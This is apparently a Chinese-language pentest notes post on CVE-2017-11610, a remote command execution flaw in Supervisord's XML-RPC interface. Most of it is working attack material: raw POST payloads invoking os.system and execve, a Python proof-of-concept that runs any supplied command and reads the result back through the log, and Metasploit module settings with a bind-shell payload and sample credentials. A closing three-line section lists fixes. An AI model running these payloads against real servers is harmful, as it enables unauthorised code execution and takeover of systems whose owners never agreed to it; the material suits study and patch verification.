---
title: Supervisord
category:
- [Kali, Exploit]
tags:
  - null
date: 2020-12-04 20:23:08
top:
updated:
---

Supervisord是由python开发的进程控制系统，用于管理后台服务的工具， 作用类似于Linux自带的Systemd程序。

Supervisord采用Client/Server架构， Server跑在系统后台， Client是个命令，通过RPC协议，调用Server提供的API，执行任务。

`RPC协议`指Client通过RPC协议可以在Server执行某个函数并得到返回结果。

## 信息收集
```zsh
sudo nmap -sV -Pn -T4 -sSU -p 9001 -sC  192.168.79.207
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-04 19:10 CST
Nmap scan report for 192.168.79.207
Host is up (0.00011s latency).

PORT     STATE  SERVICE       VERSION
9001/tcp open   http          Medusa httpd 1.12 (Supervisor process manager)
|_http-server-header: Medusa/1.12
|_http-title: Supervisor Status
9001/udp closed etlservicemgr

Nmap done: 1 IP address (1 host up) scanned in 186.59 seconds
```


## Supervisord远程命令执行漏洞-CVE-2017-11610

Requirements：

- Supervisord版本`Supervisord 3.0a1 < 3.3.2`
- RPC端口可被访问
- RPC无密码/弱口令


### BurpSuite复现

直接执行任意命令：

- POC-1

```
POST /RPC2 HTTP/1.1
Host: localhost
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 213

<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>touch /tmp/success</string>
</param>
</params>
</methodCall>
```

- POC-2-慎用(会导致业务程序退出)

```zsh
POST http://192.168.0.15:9001/RPC2 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/xml
Content-Type: text/xml
Accept-Language: en-GB,en;q=0.5
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Content-Length: 503
Host: 192.168.0.15:9001
<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.execve</methodName>
<params>
<param>
<string>/usr/bin/python</string>
</param>
<param>
<array>
<data>
<value><string>python</string></value>
<value><string>-c</string></value>
<value><string>import os; os.system("touch /tmp/blahh")</string></value>
</data>
</array>
</param>
<param>
<struct>
</struct>
</param>
</params>
</methodCall>
```



![supervisord-1](../images/supervisord-1.png)

> 关于直接回显的POC

@Ricter 在微博上提出的一个思路，甚是有效，就是将命令执行的结果写入log文件中，再调用Supervisord自带的readLog方法读取log文件，将结果读出来。

写了个简单的POC： [poc.py](/Applications/Joplin.app/Contents/Resources/app.asar/poc.py "poc.py")，直接贴出来吧：

```
#!/usr/bin/env python3
import xmlrpc.client
import sys


target = sys.argv[1]
command = sys.argv[2]
with xmlrpc.client.ServerProxy(target) as proxy:
    old = getattr(proxy, 'supervisor.readLog')(0,0)

    logfile = getattr(proxy, 'supervisor.supervisord.options.logfile.strip')()
    getattr(proxy, 'supervisor.supervisord.options.warnings.linecache.os.system')('{} | tee -a {}'.format(command, logfile))
    result = getattr(proxy, 'supervisor.readLog')(0,0)

    print(result[len(old):])
```

使用Python3执行并获取结果：`./poc.py "http://your-ip:9001/RPC2" "command"`：

![supervisord-2](../images/supervisord-2.png)

### MSF反弹shell
> 需要知道用户密码：espc：what
```
Module options (exploit/linux/http/supervisor_xmlrpc_exec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword    what               no        Password for HTTP basic auth
   HttpUsername    espc               no        Username for HTTP basic auth
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         8103             yes       The target port (TCP)
   SRVHOST       0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT       8080             yes       The local port to listen on.
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI     /RPC2            yes       The path to the XML-RPC endpoint
   URIPATH                        no        The URI to use for this exploit (default is random)
   VHOST                          no        HTTP server virtual host


Payload options (generic/shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.184.67.1      no        The target address
```


### 漏洞修复

- 升级Supervisord
- 端口访问控制
- 设置复杂RPC密码


参考：  
[Supervisord远程命令执行漏洞](https://www.leavesongs.com/PENETRATION/supervisord-RCE-CVE-2017-11610.html)